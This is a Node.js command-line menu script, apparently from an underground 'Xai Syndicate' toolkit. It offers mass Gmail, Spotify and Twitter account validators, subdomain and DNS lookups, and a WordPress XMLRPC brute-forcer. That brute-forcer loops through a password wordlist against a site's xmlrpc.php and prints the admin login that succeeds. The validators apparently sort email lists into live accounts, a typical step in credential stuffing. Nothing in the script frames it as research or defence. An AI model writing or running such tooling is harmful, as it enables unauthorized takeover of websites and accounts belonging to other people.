/// Xai Syndicate Mini Tools
const Apalo = require('./func/Xai');
const Hayolo = require('./func/Valid');
const readline = require('readline-sync');
const fs = require('async-file');
const fss = require('fs');
const rd = require('readline');
const colors = require('colors');
(async () => {
   const coeg = `
${colors.bold("Xai Syndicate Tools")}
--------------------
1. ${colors.blue("Alexa Rank")} ( Mass )
2. ${colors.blue("Gmail Validator")} ( Mass )
3. ${colors.blue("Subdomain Finder")}
4. ${colors.blue("DNS Lookup")}
5. ${colors.blue("Spotify Validator")} ( Mass )
6. ${colors.blue("Twitter Validator")} ( Mass )
7. ${colors.blue("Wordpress XMLRPC Brute Force")}
--------------------
${colors.bold("Version V1.0")}
`;
   console.log(coeg);
   const choice = readline.question("[Choose] > ");
   console.log("");
   if (choice === "") {
      console.log("Why U Did That?");
   }
   else if (choice === "1") {
      console.log("Alexa Rank Mass Check".blue);
      const lists = readline.question("[List] > ");
      var readLines = rd.createInterface({
         input: fs.createReadStream(lists)
      });

      readLines.on('line', (domain) => {
         Apalo.Alexa(domain);
      });
   }
   else if (choice === "2") {
      console.log("Gmail Email Validator".blue);
      const lists = readline.question("[List] > ");
      var readLines = rd.createInterface({
         input: fs.createReadStream(lists)
      });

      readLines.on('line', (email) => {
         Hayolo.Gmail(email);
      });
   }
   else if (choice === "3") {
      console.log("Subdomain Finder".blue);
      const domain = readline.question("[Domain] > ");
      Apalo.SUBFINDER(domain);
   }
   else if (choice === "4") {
      console.log("DNS Lookup".blue);
      const domain = readline.question("[Domain] > ");
      Apalo.DNSLOOKUP(domain);
   }
   else if (choice === "5") {
      console.log("Spotify Validator".blue);
      const lists = readline.question("[List] > ");
      var readLines = rd.createInterface({
         input: fs.createReadStream(lists)
      });
      readLines.on('line', (email) => {
         Hayolo.Spotify(email);
      })
   }
   else if (choice === "6") {
      console.log("Twitter Validator".blue);
      const lists = readline.question("[List] > ");
      var readLines = rd.createInterface({
         input: fs.createReadStream(lists)
      });
      readLines.on('line', (email) => {
         Hayolo.Twitter(email);
      })
   }
   else if (choice === "7") {
      console.log("Wordpress XMLRPC Brute Force".blue);
      console.log("Please Add http / https to site :)")
      const site = readline.question("[Site] > ");
      const user = readline.question("[User] > ");
      const wordlist = readline.question("[Wordlist] > ");
      try {
         var data = fss.readFileSync(wordlist, 'utf8').split("\n");
         var lengths = data.length;
         for(let i = 0; i < lengths; i++) {
            const coeg = await Apalo.WPBF(site + "/xmlrpc.php", user, data[i]);
            const regularngeod = /<name>isAdmin<\/name>/gm;
            if (regularngeod.exec(coeg)) {
               console.log("Brute Force Success!!".green);
               console.log("Login   : " + site + "/wp-login.php");
               console.log("User    : " + user);
               console.log("Pass    : " + data[i]);
               process.exit(1);
            }
            else {
               console.log(data[i] + colors.red(" Failed!"));
            }
         }
      } catch(e) {
         console.log("ERROR!! " + e.stack)
      }

   }
   else {
      console.log("WHUT???");
   }
})();